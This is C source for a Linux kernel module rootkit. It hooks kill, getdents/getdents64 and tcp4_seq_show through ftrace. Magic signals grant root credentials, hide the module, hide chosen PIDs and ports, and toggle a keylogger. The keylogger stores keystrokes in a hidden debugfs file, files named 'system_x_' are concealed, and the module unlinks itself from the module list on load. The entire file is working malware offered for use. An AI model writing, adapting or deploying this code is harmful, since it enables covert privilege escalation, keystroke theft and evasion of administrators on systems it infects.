#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/tcp.h>

#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* Prefix for hiding files and directories */
#define PREFIX_X "system_x_"

/* Used for hiding and showing kernel module */
static struct list_head *prev_module;
static short hidden = 1;

/* Hiding PIDs */
#define TOTAL_HIDES 16
char hide_pid[TOTAL_HIDES][NAME_MAX];

/* Hiding Ports */
int hide_port[TOTAL_HIDES] = {0};


/* Keylogger stuff */
#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
#define US  0 /* Type code for US character log */
#define HEX 1 /* Type code for hexadecimal log */
#define DEC 2 /* Type code for decimal log */

static int codes;
static short enable = 0;

/* Register global variable @codes as a module parameter with type and permissions */
module_param(codes, int, 0644);
/* Add module parameter description for @codes */
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

/* Declarations */
static struct dentry *file;
static struct dentry *subdir;

static ssize_t keys_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *offset);

static int spy_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param);

/* Definitions */

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN];

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

/**
 * keys_read - read function for @file_operations structure
 */
static ssize_t keys_read(struct file *filp,
			 char *buffer,
			 size_t len,
			 loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block spy_blk = {
	.notifier_call = spy_cb,
};

/**
 * keycode_to_string - convert keycode to readable string and save in buffer
 *
 * @keycode: keycode generated by the kernel on keypress
 * @shift_mask: Shift key pressed or not
 * @buf: buffer to store readable string
 * @type: log pattern
 */
void keycode_to_string(int keycode, int shift_mask, char *buf, int type) {
	switch (type) {
	case US:
		if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
			const char *us_key = (shift_mask == 1)
			? us_keymap[keycode][1]
			: us_keymap[keycode][0];

			snprintf(buf, CHUNK_LEN, "%s\n", us_key);
		}
		break;
	case HEX:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%x %x\n", keycode, shift_mask);
		break;
	case DEC:
		if (keycode > KEY_RESERVED && keycode < KEY_MAX)
			snprintf(buf, CHUNK_LEN, "%d %d\n", keycode, shift_mask);
		break;
	}
}

/**
 * spy_cb - keypress callback, called when a keypress
 * event occurs. Ref: @notifier_block structure.
 *
 * Returns NOTIFY_OK
 */
int spy_cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param) {
	size_t len;
	char keybuf[CHUNK_LEN] = {0};
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		 code, param->down, param->shift, param->value);

	/* Trace only when a key is pressed down */
	if (!(param->down))
		return NOTIFY_OK;

	/* Convert keycode to readable string in keybuf */
	keycode_to_string(param->value, param->shift, keybuf, codes);
	len = strlen(keybuf);
	if (len < 1) /* Unmapped keycode */
		return NOTIFY_OK;

	/* Reset key string buffer position if exhausted */
	if ((buf_pos + len) >= BUF_LEN)
		buf_pos = 0;

	/* Copy readable key to key string buffer */
	strncpy(keys_buf + buf_pos, keybuf, len);
	buf_pos += len;

	/* Append newline to keys in special cases */
	if (codes)
		keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK;
}
/* End of Keylogger stuff */


/* The linux_dirent struct got removed from the kernel headers so we have to
 * declare it ourselves */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};


/* The meat of all the hooks to avoid repeating code */
int hook_kill_meat(pid_t pid, int sig) {
    void set_root(void);
    void showme(void);
    void hideme(void);

    if ( sig == 64 ) {
        set_root();
        return 0;
    } else if ( (sig == 63) && (hidden == 0) ) {
        hideme();
        hidden = 1;
        return 0;
    } else if ( (sig == 63) && (hidden == 1) ) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 62) {
        /* If we receive the magic signal, then we just sprintf the pid
         * from the intercepted arguments into the hide_pid string */
        int i = 0;
        char tmp[NAME_MAX];

        sprintf(tmp, "%d", pid);

        /* Loop through and add to the end of the list */
        for(i = 0; i < TOTAL_HIDES; i++) {
            if (strncmp(hide_pid[i], tmp, NAME_MAX) == 0) {
                sprintf(hide_pid[i], "");
                break;
            } else if (strncmp(hide_pid[i], "", NAME_MAX) == 0) {
                sprintf(hide_pid[i], "%d", pid);
                break;
            }
        }
        return 0;
    } else if (sig == 61) {
        /* If we receive the magic signal, then we just sprintf the "pid"
         * from the intercepted arguments into the hide_port string. 
         * Note that the "pid" is the port! */
        int i = 0;

        /* Loop through and add to the end of the list */
        for(i = 0; i < TOTAL_HIDES; i++) {
            
            if (hide_port[i] == pid) {
                hide_port[i] = 0;
                break;
            } else if (hide_port[i] == 0) {
                hide_port[i] = pid;
                break;
            }
        }
        return 0;
    } else if ( (sig == 60) && (enable == 0) ) {
        register_keyboard_notifier(&spy_blk);
        enable = 1;
        return 0;
    } else if ( (sig == 60) && (enable == 1) ) {
        unregister_keyboard_notifier(&spy_blk);
        enable = 0;
        return 0;
    }

    return 1;
}

int hook_getdents64_meat(struct linux_dirent64 __user *dirent, int ret) {
    long error;
    int foundPrefix = 0;
    int found = 0;
    int i = 0;
    int first = 0;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret) {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX_X, current_dir->d_name, strlen(PREFIX_X)) == 0) {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker ) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
            foundPrefix = 1;
        }

        if (foundPrefix == 0) {
            /* loop through each of our 16 (TOTAL_HIDES) possible pids and hide each one found */
            for (i = 0; i < TOTAL_HIDES; i++) {
                /* Compare current_dir->d_name to hide_pid - we also have to check that hide_pid isn't empty! */
                if ( (memcmp(hide_pid[i], current_dir->d_name, strlen(hide_pid[i])) == 0) && (strncmp(hide_pid[i], "", NAME_MAX) != 0) ) {
                    /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
                    if ( current_dir == dirent_ker ) {
                        ret -= current_dir->d_reclen;
                        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                        first = 1;
                        break;
                    }
                    /* This is the crucial step: we add the length of the current directory to that of the 
                    * previous one. This means that when the directory structure is looped over to print/search
                    * the contents, the current directory is subsumed into that of whatever preceeds it. */
                    previous_dir->d_reclen += current_dir->d_reclen;
            
                    /* Remmeber that we found something */
                    found = 1;
                    break;
                }
            }
            if (first == 1) {
                first = 0;
                continue;
            }
        }

        if (found == 0 && foundPrefix == 0) {
            /* If we end up here, then we didn't find what we want in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        } else {
            /* Reset our found variables */
            found = 0;
            foundPrefix = 0;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}


int hook_getdents_meat(struct linux_dirent __user *dirent, int ret) {
    long error;
    int foundPrefix = 0;
    int found = 0;
    int i = 0;
    int first = 0;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */

    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret) {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX_X, current_dir->d_name, strlen(PREFIX_X)) == 0) {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker ) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
            foundPrefix = 1;
        }

        if (foundPrefix == 0) {
            /* loop through each of our 16 (TOTAL_HIDES) possible pids and hide each one found */
            for (i = 0; i < TOTAL_HIDES; i++) {
                /* Compare current_dir->d_name to hide_pid - we also have to check that hide_pid isn't empty! */
                if ( (memcmp(hide_pid[i], current_dir->d_name, strlen(hide_pid[i])) == 0) && (strncmp(hide_pid[i], "", NAME_MAX) != 0) ) {
                    /* If hide_pid is contained in the first struct in the list, then we have to shift everything else up by it's size */
                    if ( current_dir == dirent_ker ) {
                        ret -= current_dir->d_reclen;
                        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                        first = 1;
                        break;
                    }
                    /* This is the crucial step: we add the length of the current directory to that of the 
                    * previous one. This means that when the directory structure is looped over to print/search
                    * the contents, the current directory is subsumed into that of whatever preceeds it. */
                    previous_dir->d_reclen += current_dir->d_reclen;
            
                    /* Remmeber that we found something */
                    found = 1;
                    break;
                }
            }
            if (first == 1) {
                first = 0;
                continue;
            }
        }

        if (found == 0 && foundPrefix == 0) {
            /* If we end up here, then we didn't find what we want in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        } else {
            /* Reset our found variables */
            found = 0;
            foundPrefix = 0;
        }


        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}


/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_<syscall> and hook_<syscall> functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    if (hook_kill_meat(pid, sig) == 0) {
        return 0;
    }

    return orig_kill(regs);
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    int ret = orig_getdents64(regs);

    return hook_getdents64_meat(dirent, ret);

}

/* This is our hook for sys_getdetdents */
asmlinkage int hook_getdents(const struct pt_regs *regs) {
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    // int count = regs->dx;

    int ret = orig_getdents(regs);

    return hook_getdents_meat(dirent, ret);
}





#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig) {
    if (hook_kill_meat(pid, sig) == 0) {
        return 0;
    }

    return orig_kill(pid, sig);
}

static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(fd, dirent, count);

    return hook_getdents64_meat(dirent, ret);
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count) {
    /* We first have to actually call the real sys_getdents syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents(fd, dirent, count);

    return hook_getdents_meat(dirent, ret);
}
#endif

/* Hiding ports isn't a syscall, so we can just call it no matter what */
/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
/* Requires tcp4_deq_show to be exported! check /proc/kallsyms */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port;
    
    int i = 0;

    for (i = 0; i < TOTAL_HIDES; i++) {
        if (hide_port[i] == 0) {
            break;
        }

        port = htons(hide_port[i]);
        printk(KERN_INFO "%d\n", port);
        if (v != SEQ_START_TOKEN) {
            is = (struct inet_sock *)v;
            if (port == is->inet_sport || port == is->inet_dport) {
                return 0;
            }
        }
    }

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}




/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void) {
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}




/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* Module initialization function */
static int __init helper_init(void) {
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;


    /* Keylogger stuff */
    if (codes < 0 || codes > 2)
        return -EINVAL;

    subdir = debugfs_create_dir("system_x_kisni", NULL);
    if (IS_ERR(subdir))
        return PTR_ERR(subdir);
    if (!subdir)
        return -ENOENT;

    file = debugfs_create_file("system_x_keys", 0400, subdir, NULL, &keys_fops);
    if (!file) {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    hideme();

    /*
    * Add to the list of console keyboard event
    * notifiers so the callback spy_cb is called
    * when an event occurs.
    */

    return 0;
}

static void __exit helper_exit(void) {
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    /* undo keylogger */
    /* NOTE: the log file will be deleted! */
    unregister_keyboard_notifier(&spy_blk);
	debugfs_remove_recursive(subdir);
}

module_init(helper_init);
module_exit(helper_exit);